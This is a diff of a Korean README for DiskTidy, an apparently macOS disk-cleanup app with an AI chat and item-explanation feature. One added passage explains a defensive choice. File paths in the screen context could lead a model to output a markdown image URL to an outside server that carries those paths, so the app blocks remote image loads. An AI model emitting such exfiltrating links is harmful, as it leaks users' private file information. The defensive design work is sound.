@@ -36,7 +36,7 @@ macOS SSD 용량 정리 유틸리티. 캐시·시뮬레이터·빌드 캐시·�
 | Android 에뮬레이터 | `~/.android/avd`의 AVD 목록, 삭제 시 `.ini` 포인터까지 정리 |
 | 임시파일 | `/private/tmp` · `$TMPDIR`의 최상위 항목 (안전 규칙과 관측 한계는 아래) |
 | 개발 데몬 | 메모리·스왑 지표, 장기 실행 개발 데몬(Gradle · Kotlin) 종료 |
-| 설정 | AI Agent 제공자 연결 (제공자 · API 루트 URL · 모델 · API 키) |
+| 설정 | AI 제공자 연결(제공자 · API 루트 URL · 모델 · API 키), 로컬 CLI 제공자 옵트인, 창 동작(항상 위) |
 
 메뉴바 아이콘은 SSD 사용률(%)을 60초마다 갱신해 상시 표시하고, 클릭하면 게이지 + 앱 열기/종료만 뜨는 최소 드롭다운을 보여준다.
 
@@ -58,6 +58,10 @@ Dock 아이콘이 없는 앱(`LSUIElement`)이라 창이 다른 앱 뒤로 숨�
 | OpenAI 호환 (직접 입력) | 사용자가 입력 | Chat Completions |
 
 버전 경로(`/v1/messages`, `/v1/chat/completions`)는 앱이 붙인다. 루트만 넣으면 되고 `/v1`이나 문서에서 복사한 전체 엔드포인트 경로를 붙여도 흡수한다.
+
+### 항목 설명 버튼 (ⓘ)
+
+목록 각 줄의 ⓘ 버튼을 누르면 그 항목이 무엇이고 지워도 되는지 팝오버로 설명한다. **앱이 스스로 아는 항목은 AI에게 묻지 않는다** — 목록에 들어온 경로 대부분은 앱이 찾아서 넣은 것이라(예: `~/.gradle/caches`) 정체를 모델에게 되묻는 것은 느리고 비싸고 덜 정확하다. `KnownItemCatalog`에 적힌 항목(DerivedData · Archives · DeviceSupport · Gradle 캐시 등)은 AI 연결 없이도 즉시 뜨고, 대용량 파일·임시파일 탭의 낯선 경로와 처음 보는 프로세스만 AI에게 넘긴다. 받은 답은 캐시되어 같은 항목을 다시 눌러도 재요청하지 않는다.
 
 **모델은 드롭다운에서 고른다.** 설정 화면이 열릴 때 `GET /v1/models`로 목록을 받아 온다(두 와이어 포맷이 같은 응답 형식을 쓴다). 임베딩·음성·이미지·모더레이션 모델은 골라 봐야 실패하므로 목록에서 뺀다. 사내 게이트웨이나 프리뷰 모델처럼 목록에 없는 이름을 써야 하면 **직접 입력**을 켠다. 목록 조회는 모델 이름을 요구하지 않는다 — 이름을 몰라서 쓰는 기능이기 때문이다.
 
@@ -100,10 +104,6 @@ codex exec --json --sandbox read-only --skip-git-repo-check --ephemeral \
 
 **실행 파일 경로**: 터미널에서 CLI에 한 번 로그인한 뒤 `which claude`(또는 `which codex`) 결과를 설정의 **CLI 실행 파일 경로**에 넣는다. 기본값은 흔한 설치 위치와 nvm 버전 디렉터리를 훑어 채운다 — GUI로 실행된 앱의 `PATH`에는 `/usr/bin:/bin` 정도만 있어서 이름만으로는 찾지 못한다. npm으로 깐 CLI는 `#!/usr/bin/env node` 셰방이라 `node`도 찾아야 하므로, 자식 프로세스의 `PATH` 맨 앞에 **실행 파일이 있는 디렉터리**를 넣어 준다.
 
-준비: 터미널에서 `claude`를 한 번 실행해 로그인해 두고, 설정 탭의 **CLI 실행 파일 경로**에 `which claude` 결과를 넣는다(기본값은 `~/.local/bin/claude` 등 흔한 위치를 훑어 채운다 — GUI로 실행한 앱의 `PATH`는 `/usr/bin:/bin:/usr/sbin:/sbin`뿐이라 자동으로 찾지 못한다). 모델은 CLI 별칭(`sonnet` · `opus` · `haiku`) 드롭다운에서 고른다.
-
-한계: 조각 단위 스트리밍이 아니라 한 번에 받아 한 덩어리로 표시한다. CLI의 stream-json 형식은 도구마다 달라서, 필요해지면 도구별 파서를 붙인다.
-
 **보내지는 정보** — 질문할 때마다 그 화면의 **항목 이름·경로·용량·선택 상태**가 선택한 제공자의 서버로 전송된다. 파일 내용은 보내지 않는다. 밖으로 내보내고 싶지 않으면 Ollama 같은 로컬 제공자를 쓴다.
 
 **키 저장** — API 키는 macOS 키체인(`com.jimmy.disktidy.ai`)에 제공자별로 저장한다. `UserDefaults`에는 제공자·루트 URL·모델만 남는다. ad-hoc 서명 빌드는 빌드마다 서명 identity가 바뀌어 키체인 접근 권한을 다시 묻는다.
@@ -112,7 +112,7 @@ codex exec --json --sandbox read-only --skip-git-repo-check --ephemeral \
 
 원격 평문 `http`로는 요청을 보내지 않는다(키 노출). `http`는 루프백(`localhost` · `127.0.0.1` · `::1`)에만 허용하고, `*.local` LAN 주소는 **키가 필요 없는 로컬 제공자에만** 허용한다.
 
-답변은 마크다운으로 그린다. 모델이 실제로 쓰는 것(굵게·기울임·인라인 코드, 글머리표, 번호 목록, 제목, 코드 블록)만 해석하며, 인라인 서식은 Foundation의 `AttributedString(markdown:)`에 맡긴다. 스트리밍 중 도착하는 반쪽 문법(`**굵게`)이나 닫히지 않은 코드 블록에도 글자를 잃지 않는다. 사용자가 입력한 메시지는 원문 그대로 둔다 — 직접 적은 `*`가 서식으로 먹히면 원문이 바뀐 것처럼 보인다.
+답변은 [MarkdownView](https://github.com/LiYanan2004/MarkdownView)로 그린다 — 스트리밍 증분 파싱과 블록을 넘는 텍스트 선택이 필요해서다. 기본값에서 둘을 바꿨다. **원격 이미지는 요청 자체를 만들지 않는다** — 화면 스냅샷에 든 파일 경로가 모델을 유도해 `![](https://남의서버/?p=...)`를 출력시키면 답변이 그려지는 순간 경로가 밖으로 새기 때문이다. **구문 강조·수식 렌더는 끈다** — 라이브러리 기본 스타일이 `Bundle.module`로 리소스를 찾는데, ad-hoc 서명 앱에서는 그 번들을 `.app` 루트에 넣으면 서명이 깨지고 빼면 다른 머신에서 `fatalError`가 난다(실측). 사용자가 입력한 메시지는 원문 그대로 둔다 — 직접 적은 `*`가 서식으로 먹히면 원문이 바뀐 것처럼 보인다.
 
 답변은 1024 토큰에서 끊는다. 상한에 걸려 잘리면 답변 끝에 `(답변이 길이 제한으로 잘렸습니다.)`를 붙인다 — 잘린 답변을 완결된 답변으로 읽으면 안 되기 때문이다.
 
@@ -169,7 +169,7 @@ codex exec --json --sandbox read-only --skip-git-repo-check --ephemeral \
 ## 요구사항
 
 - macOS 14 이상
-- Xcode 16 이상 (Swift Testing 사용)
+- Xcode 26 이상 — 의존성 MarkdownView 3.0.0이 Swift tools 6.2를 요구한다 (테스트는 Swift Testing)
 - 첫 실행 시 `~/Documents`, `~/Downloads` 등 접근에 대한 macOS 파일 접근 권한(TCC) 승인 필요
 
 ## 실행
@@ -272,18 +272,22 @@ DiskTidy/
     DiskTidyApp.swift      # @main, WindowGroup + MenuBarExtra
     Models/                # CleanableItem, TempCandidate, SimulatorItem, StorageSnapshot,
                            #   AppNavigationState + AI(AIProvider, AIChatMessage,
-                           #   ScreenContext, ChatContextStore)
+                           #   ScreenContext, ChatContextStore, KnownItemCatalog)
     Services/              # 스캐너 + 공용 헬퍼(ShellRunner, DiskScanner, TrashService,
                            #   RootFolderStore, FileAttributes, StorageInfo, StorageMonitor)
                            #   + 임시파일 전용(TempRootPolicy, TempScanner, PermanentDeleter)
                            #   + AI(APIKeyStore, SettingsStore, AIRequestBuilder,
-                           #   AIStreamParser, AIChatClient, AIModelCatalog, AIChatError)
+                           #   AIStreamParser, AIChatClient, AIModelCatalog, AIChatError,
+                           #   AICLIClient, AICLIStreamParser)
     ViewModels/            # CleanableListViewModel(전 캐시 탭 공용), SimulatorViewModel,
                            #   RootFolderViewModel, TempCleanupViewModel, MemoryViewModel,
-                           #   AISettingsViewModel, ChatViewModel, ScreenContextBuilder
+                           #   AISettingsViewModel, ChatViewModel, ScreenContextBuilder,
+                           #   ItemExplanationStore
     Views/                 # ContentView(사이드바 + AI 패널 토글) + 화면별 탭 뷰 +
-                           #   공용 컴포넌트(CleanableListView, RootFolderPicker, ErrorBanner)
-                           #   + AI(SettingsTabView, ChatPanelView, ScreenContextModifier)
+                           #   공용 컴포넌트(CleanableListView, RootFolderPicker, ErrorBanner,
+                           #   WindowPresenter)
+                           #   + AI(SettingsTabView, ChatPanelView, ChatMarkdownStyle,
+                           #   ExplanationButton, ScreenContextModifier)
   Tests/DiskTidyTests/     # Swift Testing
 ```
 
